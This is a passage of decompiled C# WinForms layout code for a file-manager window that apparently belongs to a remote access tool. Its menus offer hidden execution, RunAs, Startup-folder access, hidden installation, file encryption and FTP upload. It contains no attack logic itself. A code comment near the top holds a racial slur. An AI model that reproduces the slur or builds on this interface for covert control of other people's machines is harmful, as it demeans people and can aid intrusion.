		this.Guna2GradientButton4 = new Guna.UI2.WinForms.Guna2GradientButton();
		this.Guna2ContextMenuStrip2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).BeginInit();
		this.StatusStrip1.SuspendLayout();
		this.Guna2Panel1.SuspendLayout();
		base.SuspendLayout();
		// n i g g e r $
		this.ListView1.DoubleClick += new System.EventHandler(ListView1_DoubleClick);
		this.ListView1.KeyDown += new System.Windows.Forms.KeyEventHandler(ListView1_KeyDown);
		this.ListView1.SelectedIndexChanged += new System.EventHandler(ListView1_SelectedIndexChanged);
		this.ListView1.DragEnter += new System.Windows.Forms.DragEventHandler(ListView1_DragEnter);
		this.ListView1.DragDrop += new System.Windows.Forms.DragEventHandler(ListView1_DragDrop);
		this.Timer1.Tick += new System.EventHandler(Timer1_Tick);
		this.ToolStripStatusLabel1.Click += new System.EventHandler(ToolStripStatusLabel1_Click);
		this.Guna2TextBox1.KeyDown += new System.Windows.Forms.KeyEventHandler
			(Guna2TextBox1_KeyDown);
		this.BackToolStripMenuItem1.Click += new System.EventHandler(BackToolStripMenuItem1_Click);
		this.RefreshToolStripMenuItem.Click += new System.EventHandler(RefreshToolStripMenuItem_Click);
		this.DesktopToolStripMenuItem.Click += new System.EventHandler(DesktopToolStripMenuItem_Click);
		this.UserFolderToolStripMenuItem.Click += new System.EventHandler(UserFolderToolStripMenuItem_Click);
		this.TempToolStripMenuItem1.Click += new System.EventHandler(TempToolStripMenuItem1_Click);
		this.AppDataToolStripMenuItem.Click += new System.EventHandler(AppDataToolStripMenuItem_Click);
		this.StartupToolStripMenuItem1.Click += new System.EventHandler(StartupToolStripMenuItem1_Click);
		this.CopyToolStripMenuItem1.Click += new System.EventHandler(CopyToolStripMenuItem1_Click);
		this.CutToolStripMenuItem1.Click += new System.EventHandler(CutToolStripMenuItem1_Click);
		this.PasteToolStripMenuItem.Click += new System.EventHandler(PasteToolStripMenuItem_Click);
		this.EditToolStripMenuItem1.Click += new System.EventHandler(EditToolStripMenuItem1_Click);
		this.NormalToolStripMenuItem1.Click += new System.EventHandler(NormalToolStripMenuItem1_Click);
		this.HiddenToolStripMenuItem1.Click += new System.EventHandler(HiddenToolStripMenuItem1_Click);
		this.RunAsToolStripMenuItem1.Click += new System.EventHandler(RunAsToolStripMenuItem1_Click);
		this.RenameToolStripMenuItem1.Click += new System.EventHandler(RenameToolStripMenuItem1_Click);
		this.DeleteToolStripMenuItem1.Click += new System.EventHandler(DeleteToolStripMenuItem1_Click);
		this.UploadToolStripMenuItem2.Click += new System.EventHandler(UploadToolStripMenuItem2_Click);
		this.DownloadToolStripMenuItem1.Click += new System.EventHandler(DownloadToolStripMenuItem1_Click);
		this.NewFolderToolStripMenuItem1.Click += new System.EventHandler(NewFolderToolStripMenuItem1_Click);
		this.NewFileToolStripMenuItem.Click += new System.EventHandler(NewFileToolStripMenuItem_Click);
		this.ShowFolderFileToolStripMenuItem.Click += new System.EventHandler(ShowFolderFileToolStripMenuItem_Click);
		this.HideFolderFileToolStripMenuItem.Click += new System.EventHandler(HideFolderFileToolStripMenuItem_Click);
		this.HiddenInstallationlToolStripMenuItem.Click += new System.EventHandler(HiddenInstallationlToolStripMenuItem_Click);
		this.ZipToolStripMenuItem2.Click += new System.EventHandler(ZipToolStripMenuItem2_Click);
		this.UnzipToolStripMenuItem1.Click += new System.EventHandler(UnzipToolStripMenuItem1_Click);
		this.UploadToolStripMenuItem.Click += new System.EventHandler(UploadToolStripMenuItem_Click);
		this.SettingsToolStripMenuItem1.Click += new System.EventHandler(SettingsToolStripMenuItem1_Click);
		this.SendFromLinkToolStripMenuItem1.Click += new System.EventHandler(SendFromLinkToolStripMenuItem1_Click);
		this.SetBackgroundToolStripMenuItem1.Click += new System.EventHandler(SetBackgroundToolStripMenuItem1_Click);
		this.PlayToolStripMenuItem1.Click += new System.EventHandler(PlayToolStripMenuItem1_Click);
		this.StopToolStripMenuItem1.Click += new System.EventHandler(StopToolStripMenuItem1_Click);
		this.EncryptToolStripMenuItem.Click += new System.EventHandler(EncryptToolStripMenuItem_Click);
		this.DecryptToolStripMenuItem.Click += new System.EventHandler(DecryptToolStripMenuItem_Click);
		this.LockToolStripMenuItem.Click += new System.EventHandler(LockToolStripMenuItem_Click);
		this.UnlockToolStripMenuItem.Click += new System.EventHandler(UnlockToolStripMenuItem_Click);
		this.DownloadFolderToolStripMenuItem.Click += new System.EventHandler(DownloadFolderToolStripMenuItem_Click);
		this.Guna2GradientButton4.Click += new System.EventHandler(Guna2GradientButton4_Click);
		this.Guna2TextBox2.TextChanged += new System.EventHandler(Guna2TextBox2_TextChanged);
		this.Guna2TextBox2.KeyPress += new System.Windows.Forms.KeyPressEventHandler(Guna2TextBox2_KeyPress);
		this.FileHashToolStripMenuItem.Click += new System.EventHandler(FileHashToolStripMenuItem_Click);
		this.ImageList1.ColorDepth = System.Windows.Forms.ColorDepth.Depth32Bit;
		this.ImageList1.ImageSize = new System.Drawing.Size(20, 20);
		this.ImageList1.TransparentColor = System.Drawing.Color.Transparent;
		this.FileName.Text = "[ Name ]";
		this.FileName.Width = 185;
		this.ListView1.AllowDrop = true;
		this.ListView1.BackColor = System.Drawing.Color.White;
		this.ListView1.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.ListView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[4] { this.FileName, this.Datemod, this.Type, this.Fsize });
		this.ListView1.ContextMenuStrip = this.Guna2ContextMenuStrip2;
		this.ListView1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.ListView1.Font = new System.Drawing.Font("Tahoma", 8f);
		this.ListView1.ForeColor = System.Drawing.Color.Black;
		this.ListView1.FullRowSelect = true;
		this.ListView1.HeaderStyle = System.Windows.Forms.ColumnHeaderStyle.Nonclickable;
		this.ListView1.HideSelection = false;
		this.ListView1.Location = new System.Drawing.Point(0, 32);
		this.ListView1.Name = "ListView1";
		this.ListView1.ShowGroups = false;
		this.ListView1.ShowItemToolTips = true;
		this.ListView1.Size = new System.Drawing.Size(651, 316);
		this.ListView1.SmallImageList = this.ImageList1;
		this.ListView1.TabIndex = 9;
		this.ListView1.UseCompatibleStateImageBehavior = false;
		this.ListView1.View = System.Windows.Forms.View.Details;
		this.Datemod.Text = "[ Date modified ]";
		this.Datemod.Width = 130;
		this.Type.Text = "[ Type ]";
		this.Type.Width = 157;
		this.Fsize.Text = "[ Size ]";
		this.Fsize.Width = 89;
		this.Guna2ContextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[24]
		{
			this.BackToolStripMenuItem1, this.RefreshToolStripMenuItem, this.GoToToolStripMenuItem1, this.CopyToolStripMenuItem1, this.CutToolStripMenuItem1, this.PasteToolStripMenuItem, this.EditToolStripMenuItem1, this.FileHashToolStripMenuItem, this.ExecuteToolStripMenuItem1, this.DeleteToolStripMenuItem1,
			this.DownloadToolStripMenuItem1, this.RenameToolStripMenuItem1, this.UploadToolStripMenuItem2, this.NewFolderToolStripMenuItem1, this.ToolStripMenuItem2, this.FolderLockToolStripMenuItem, this.NewFileToolStripMenuItem, this.ShowHideToolStripMenuItem1, this.ZipToolStripMenuItem1, this.FtpToolStripMenuItem,
			this.SendFromLinkToolStripMenuItem1, this.SetBackgroundToolStripMenuItem1, this.PlayMusicToolStripMenuItem, this.DownloadFolderToolStripMenuItem
		});
		this.Guna2ContextMenuStrip2.Name = "Guna2ContextMenuStrip2";
		this.Guna2ContextMenuStrip2.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(151, 143, 255);
		this.Guna2ContextMenuStrip2.RenderStyle.BorderColor = System.Drawing.Color.Gainsboro;
		this.Guna2ContextMenuStrip2.RenderStyle.ColorTable = null;
		this.Guna2ContextMenuStrip2.RenderStyle.RoundedEdges = true;
		this.Guna2ContextMenuStrip2.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
		this.Guna2ContextMenuStrip2.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(113, 74, 250);
		this.Guna2ContextMenuStrip2.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
		this.Guna2ContextMenuStrip2.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
		this.Guna2ContextMenuStrip2.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
		this.Guna2ContextMenuStrip2.Size = new System.Drawing.Size(181, 554);
		this.BackToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.BackToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("BackToolStripMenuItem1.Image");
		this.BackToolStripMenuItem1.Name = "BackToolStripMenuItem1";
		this.BackToolStripMenuItem1.Size = new System.Drawing.Size(180, 22);
		this.BackToolStripMenuItem1.Text = "[ Back ]";
		this.RefreshToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.RefreshToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("RefreshToolStripMenuItem.Image");
		this.RefreshToolStripMenuItem.Name = "RefreshToolStripMenuItem";
		this.RefreshToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
		this.RefreshToolStripMenuItem.Text = "[ Refresh ]";
		this.GoToToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.GoToToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[5] { this.DesktopToolStripMenuItem, this.UserFolderToolStripMenuItem, this.TempToolStripMenuItem1, this.AppDataToolStripMenuItem, this.StartupToolStripMenuItem1 });
		this.GoToToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("GoToToolStripMenuItem1.Image");
		this.GoToToolStripMenuItem1.Name = "GoToToolStripMenuItem1";
		this.GoToToolStripMenuItem1.Size = new System.Drawing.Size(178, 22);
		this.GoToToolStripMenuItem1.Text = "[ GoTo ]";
		this.DesktopToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.DesktopToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("DesktopToolStripMenuItem.Image");
		this.DesktopToolStripMenuItem.Name = "DesktopToolStripMenuItem";
		this.DesktopToolStripMenuItem.Size = new System.Drawing.Size(147, 22);
		this.DesktopToolStripMenuItem.Text = "[ Desktop ]";
		this.UserFolderToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.UserFolderToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("UserFolderToolStripMenuItem.Image");
		this.UserFolderToolStripMenuItem.Name = "UserFolderToolStripMenuItem";
		this.UserFolderToolStripMenuItem.Size = new System.Drawing.Size(147, 22);
		this.UserFolderToolStripMenuItem.Text = "[ User Folder ]";
		this.TempToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.TempToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("TempToolStripMenuItem1.Image");
		this.TempToolStripMenuItem1.Name = "TempToolStripMenuItem1";
		this.TempToolStripMenuItem1.Size = new System.Drawing.Size(147, 22);
		this.TempToolStripMenuItem1.Text = "[ Temp ]";
		this.AppDataToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.AppDataToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("AppDataToolStripMenuItem.Image");
		this.AppDataToolStripMenuItem.Name = "AppDataToolStripMenuItem";
		this.AppDataToolStripMenuItem.Size = new System.Drawing.Size(147, 22);
		this.AppDataToolStripMenuItem.Text = "[ AppData ]";
		this.StartupToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.StartupToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("StartupToolStripMenuItem1.Image");
		this.StartupToolStripMenuItem1.Name = "StartupToolStripMenuItem1";
		this.StartupToolStripMenuItem1.Size = new System.Drawing.Size(147, 22);
		this.StartupToolStripMenuItem1.Text = "[ Startup ]";
		this.CopyToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.CopyToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("CopyToolStripMenuItem1.Image");
		this.CopyToolStripMenuItem1.Name = "CopyToolStripMenuItem1";
		this.CopyToolStripMenuItem1.Size = new System.Drawing.Size(178, 22);
		this.CopyToolStripMenuItem1.Text = "[ Copy ]";
		this.CutToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.CutToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("CutToolStripMenuItem1.Image");
		this.CutToolStripMenuItem1.Name = "CutToolStripMenuItem1";
		this.CutToolStripMenuItem1.Size = new System.Drawing.Size(178, 22);
		this.CutToolStripMenuItem1.Text = "[ Cut ]";
		this.PasteToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.PasteToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("PasteToolStripMenuItem.Image");
		this.PasteToolStripMenuItem.Name = "PasteToolStripMenuItem";
		this.PasteToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
		this.PasteToolStripMenuItem.Text = "[ Paste ]";
		this.EditToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.EditToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("EditToolStripMenuItem1.Image");
		this.EditToolStripMenuItem1.Name = "EditToolStripMenuItem1";
		this.EditToolStripMenuItem1.Size = new System.Drawing.Size(178, 22);
		this.EditToolStripMenuItem1.Text = "[ Edit ]";
		this.FileHashToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.FileHashToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("FileHashToolStripMenuItem.Image");
		this.FileHashToolStripMenuItem.Name = "FileHashToolStripMenuItem";
		this.FileHashToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.FileHashToolStripMenuItem.Text = "[ File Hash ]";
		this.ExecuteToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.ExecuteToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.NormalToolStripMenuItem1, this.HiddenToolStripMenuItem1, this.RunAsToolStripMenuItem1 });
		this.ExecuteToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("ExecuteToolStripMenuItem1.Image");
		this.ExecuteToolStripMenuItem1.Name = "ExecuteToolStripMenuItem1";
		this.ExecuteToolStripMenuItem1.Size = new System.Drawing.Size(178, 22);
		this.ExecuteToolStripMenuItem1.Text = "[ Execute ]";
		this.NormalToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.NormalToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("NormalToolStripMenuItem1.Image");
		this.NormalToolStripMenuItem1.Name = "NormalToolStripMenuItem1";
		this.NormalToolStripMenuItem1.Size = new System.Drawing.Size(128, 22);
		this.NormalToolStripMenuItem1.Text = "[ Normal ]";
		this.HiddenToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.HiddenToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("HiddenToolStripMenuItem1.Image");
		this.HiddenToolStripMenuItem1.Name = "HiddenToolStripMenuItem1";
		this.HiddenToolStripMenuItem1.Size = new System.Drawing.Size(128, 22);
		this.HiddenToolStripMenuItem1.Text = "[ Hidden ]";
		this.RunAsToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.RunAsToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("RunAsToolStripMenuItem1.Image");
		this.RunAsToolStripMenuItem1.Name = "RunAsToolStripMenuItem1";
		this.RunAsToolStripMenuItem1.Size = new System.Drawing.Size(128, 22);
		this.RunAsToolStripMenuItem1.Text = "[ RunAs ]";
		this.DeleteToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.DeleteToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("DeleteToolStripMenuItem1.Image");
		this.DeleteToolStripMenuItem1.Name = "DeleteToolStripMenuItem1";
		this.DeleteToolStripMenuItem1.Size = new System.Drawing.Size(178, 22);
		this.DeleteToolStripMenuItem1.Text = "[ Delete ]";
		this.DownloadToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.DownloadToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("DownloadToolStripMenuItem1.Image");
		this.DownloadToolStripMenuItem1.Name = "DownloadToolStripMenuItem1";
		this.DownloadToolStripMenuItem1.Size = new System.Drawing.Size(178, 22);
		this.DownloadToolStripMenuItem1.Text = "[ Download ]";
		this.RenameToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.RenameToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("RenameToolStripMenuItem1.Image");
		this.RenameToolStripMenuItem1.Name = "RenameToolStripMenuItem1";
		this.RenameToolStripMenuItem1.Size = new System.Drawing.Size(178, 22);
		this.RenameToolStripMenuItem1.Text = "[ Rename ]";
		this.UploadToolStripMenuItem2.BackColor = System.Drawing.Color.White;
		this.UploadToolStripMenuItem2.Image = (System.Drawing.Image)resources.GetObject("UploadToolStripMenuItem2.Image");
		this.UploadToolStripMenuItem2.Name = "UploadToolStripMenuItem2";
		this.UploadToolStripMenuItem2.Size = new System.Drawing.Size(178, 22);
		this.UploadToolStripMenuItem2.Text = "[ Upload ]";
		this.NewFolderToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.NewFolderToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("NewFolderToolStripMenuItem1.Image");
		this.NewFolderToolStripMenuItem1.Name = "NewFolderToolStripMenuItem1";
		this.NewFolderToolStripMenuItem1.Size = new System.Drawing.Size(178, 22);
		this.NewFolderToolStripMenuItem1.Text = "[ New Folder ]";
		this.ToolStripMenuItem2.BackColor = System.Drawing.Color.White;
		this.ToolStripMenuItem2.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.EncryptToolStripMenuItem, this.DecryptToolStripMenuItem });
		this.ToolStripMenuItem2.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem2.Image");
		this.ToolStripMenuItem2.Name = "ToolStripMenuItem2";
		this.ToolStripMenuItem2.Size = new System.Drawing.Size(178, 22);
		this.ToolStripMenuItem2.Text = "[ File Encrypt ]";
		this.EncryptToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.EncryptToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("EncryptToolStripMenuItem.Image");
		this.EncryptToolStripMenuItem.Name = "EncryptToolStripMenuItem";
		this.EncryptToolStripMenuItem.Size = new System.Drawing.Size(129, 22);
		this.EncryptToolStripMenuItem.Text = "[ Encrypt ]";
		this.DecryptToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.DecryptToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("DecryptToolStripMenuItem.Image");
		this.DecryptToolStripMenuItem.Name = "DecryptToolStripMenuItem";
		this.DecryptToolStripMenuItem.Size = new System.Drawing.Size(129, 22);
		this.DecryptToolStripMenuItem.Text = "[ Decrypt ]";
		this.FolderLockToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.FolderLockToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.LockToolStripMenuItem, this.UnlockToolStripMenuItem });
		this.FolderLockToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("FolderLockToolStripMenuItem.Image");
		this.FolderLockToolStripMenuItem.Name = "FolderLockToolStripMenuItem";
		this.FolderLockToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
		this.FolderLockToolStripMenuItem.Text = "[ Folder Lock ]";
		this.LockToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.LockToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("LockToolStripMenuItem.Image");
		this.LockToolStripMenuItem.Name = "LockToolStripMenuItem";
		this.LockToolStripMenuItem.Size = new System.Drawing.Size(125, 22);
		this.LockToolStripMenuItem.Text = "[ Lock ]";
		this.UnlockToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.UnlockToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("UnlockToolStripMenuItem.Image");
		this.UnlockToolStripMenuItem.Name = "UnlockToolStripMenuItem";
		this.UnlockToolStripMenuItem.Size = new System.Drawing.Size(125, 22);
		this.UnlockToolStripMenuItem.Text = "[ Unlock ]";
		this.NewFileToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.NewFileToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("NewFileToolStripMenuItem.Image");
		this.NewFileToolStripMenuItem.Name = "NewFileToolStripMenuItem";
		this.NewFileToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
		this.NewFileToolStripMenuItem.Text = "[ New File ]";
		this.ShowHideToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.ShowHideToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.ShowFolderFileToolStripMenuItem, this.HideFolderFileToolStripMenuItem });
		this.ShowHideToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("ShowHideToolStripMenuItem1.Image");
		this.ShowHideToolStripMenuItem1.Name = "ShowHideToolStripMenuItem1";
		this.ShowHideToolStripMenuItem1.Size = new System.Drawing.Size(178, 22);
		this.ShowHideToolStripMenuItem1.Text = "[ Show/Hide ]";
		this.ShowFolderFileToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.ShowFolderFileToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("ShowFolderFileToolStripMenuItem.Image");
		this.ShowFolderFileToolStripMenuItem.Name = "ShowFolderFileToolStripMenuItem";
		this.ShowFolderFileToolStripMenuItem.Size = new System.Drawing.Size(176, 22);
		this.ShowFolderFileToolStripMenuItem.Text = "[ Show Folder/File ]";
		this.HideFolderFileToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.HideFolderFileToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("HideFolderFileToolStripMenuItem.Image");
		this.HideFolderFileToolStripMenuItem.Name = "HideFolderFileToolStripMenuItem";
		this.HideFolderFileToolStripMenuItem.Size = new System.Drawing.Size(176, 22);
		this.HideFolderFileToolStripMenuItem.Text = "[ Hide Folder/File ]";
		this.ZipToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.ZipToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.HiddenInstallationlToolStripMenuItem, this.ZipToolStripMenuItem2, this.UnzipToolStripMenuItem1 });
		this.ZipToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("ZipToolStripMenuItem1.Image");
		this.ZipToolStripMenuItem1.Name = "ZipToolStripMenuItem1";
		this.ZipToolStripMenuItem1.Size = new System.Drawing.Size(178, 22);
		this.ZipToolStripMenuItem1.Text = "[ 7-Zip ]";
		this.HiddenInstallationlToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.HiddenInstallationlToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("HiddenInstallationlToolStripMenuItem.Image");
		this.HiddenInstallationlToolStripMenuItem.Name = "HiddenInstallationlToolStripMenuItem";
		this.HiddenInstallationlToolStripMenuItem.Size = new System.Drawing.Size(119, 22);
		this.HiddenInstallationlToolStripMenuItem.Text = "[ Install ]";
		this.ZipToolStripMenuItem2.BackColor = System.Drawing.Color.White;
		this.ZipToolStripMenuItem2.Image = (System.Drawing.Image)resources.GetObject("ZipToolStripMenuItem2.Image");
		this.ZipToolStripMenuItem2.Name = "ZipToolStripMenuItem2";
		this.ZipToolStripMenuItem2.Size = new System.Drawing.Size(119, 22);
		this.ZipToolStripMenuItem2.Text = "[ Zip ]";
		this.UnzipToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.UnzipToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("UnzipToolStripMenuItem1.Image");
		this.UnzipToolStripMenuItem1.Name = "UnzipToolStripMenuItem1";
		this.UnzipToolStripMenuItem1.Size = new System.Drawing.Size(119, 22);
		this.UnzipToolStripMenuItem1.Text = "[ Unzip ]";
		this.FtpToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.FtpToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.UploadToolStripMenuItem, this.SettingsToolStripMenuItem1 });
		this.FtpToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("FtpToolStripMenuItem.Image");
		this.FtpToolStripMenuItem.Name = "FtpToolStripMenuItem";
		this.FtpToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
		this.FtpToolStripMenuItem.Text = "[ Ftp ]";
		this.UploadToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.UploadToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("UploadToolStripMenuItem.Image");
		this.UploadToolStripMenuItem.Name = "UploadToolStripMenuItem";
		this.UploadToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
		this.UploadToolStripMenuItem.Text = "[ Upload ]";
		this.SettingsToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.SettingsToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("SettingsToolStripMenuItem1.Image");
		this.SettingsToolStripMenuItem1.Name = "SettingsToolStripMenuItem1";
		this.SettingsToolStripMenuItem1.Size = new System.Drawing.Size(130, 22);
		this.SettingsToolStripMenuItem1.Text = "[ Settings ]";
		this.SendFromLinkToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.SendFromLinkToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("SendFromLinkToolStripMenuItem1.Image");
		this.SendFromLinkToolStripMenuItem1.Name = "SendFromLinkToolStripMenuItem1";
		this.SendFromLinkToolStripMenuItem1.Size = new System.Drawing.Size(178, 22);
		this.SendFromLinkToolStripMenuItem1.Text = "[ Send From Link ]";
		this.SetBackgroundToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.SetBackgroundToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("SetBackgroundToolStripMenuItem1.Image");
		this.SetBackgroundToolStripMenuItem1.Name = "SetBackgroundToolStripMenuItem1";
		this.SetBackgroundToolStripMenuItem1.Size = new System.Drawing.Size(178, 22);
		this.SetBackgroundToolStripMenuItem1.Text = "[ Set Background ]";
		this.PlayMusicToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.PlayMusicToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.PlayToolStripMenuItem1, this.StopToolStripMenuItem1 });
		this.PlayMusicToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("PlayMusicToolStripMenuItem.Image");
		this.PlayMusicToolStripMenuItem.Name = "PlayMusicToolStripMenuItem";
		this.PlayMusicToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
		this.PlayMusicToolStripMenuItem.Text = "[ Play Music ]";
		this.PlayToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.PlayToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("PlayToolStripMenuItem1.Image");
		this.PlayToolStripMenuItem1.Name = "PlayToolStripMenuItem1";
		this.PlayToolStripMenuItem1.Size = new System.Drawing.Size(112, 22);
		this.PlayToolStripMenuItem1.Text = "[ Play ]";
		this.StopToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.StopToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("StopToolStripMenuItem1.Image");
		this.StopToolStripMenuItem1.Name = "StopToolStripMenuItem1";
		this.StopToolStripMenuItem1.Size = new System.Drawing.Size(112, 22);
		this.StopToolStripMenuItem1.Text = "[ Stop ]";
		this.DownloadFolderToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.DownloadFolderToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("DownloadFolderToolStripMenuItem.Image");
		this.DownloadFolderToolStripMenuItem.Name = "DownloadFolderToolStripMenuItem";
		this.DownloadFolderToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
		this.DownloadFolderToolStripMenuItem.Text = "[ Download Folder ]";
		this.PictureBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.PictureBox1.Location = new System.Drawing.Point(407, 197);
		this.PictureBox1.Name = "PictureBox1";
		this.PictureBox1.Size = new System.Drawing.Size(232, 139);
		this.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.PictureBox1.TabIndex = 9;
		this.PictureBox1.TabStop = false;
		this.Timer1.Enabled = true;
		this.Timer1.Interval = 1000;
		this.StatusStrip1.BackColor = System.Drawing.Color.White;
		this.StatusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.ToolStripStatusLabel1, this.ToolStripStatusLabel2 });
		this.StatusStrip1.Location = new System.Drawing.Point(0, 369);
		this.StatusStrip1.Name = "StatusStrip1";
		this.StatusStrip1.Size = new System.Drawing.Size(651, 22);
		this.StatusStrip1.TabIndex = 11;
		this.StatusStrip1.Text = "StatusStrip1";
		this.ToolStripStatusLabel1.ActiveLinkColor = System.Drawing.Color.Blue;
		this.ToolStripStatusLabel1.ForeColor = System.Drawing.Color.Black;
		this.ToolStripStatusLabel1.LinkColor = System.Drawing.Color.White;
		this.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1";
		this.ToolStripStatusLabel1.Size = new System.Drawing.Size(16, 17);
		this.ToolStripStatusLabel1.Text = "...";
		this.ToolStripStatusLabel1.Visible = false;
		this.ToolStripStatusLabel2.ForeColor = System.Drawing.Color.Black;
		this.ToolStripStatusLabel2.Name = "ToolStripStatusLabel2";
		this.ToolStripStatusLabel2.Size = new System.Drawing.Size(13, 17);
		this.ToolStripStatusLabel2.Text = "..";
		this.Guna2TextBox1.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox1.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox1.DefaultText = "";
		this.Guna2TextBox1.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
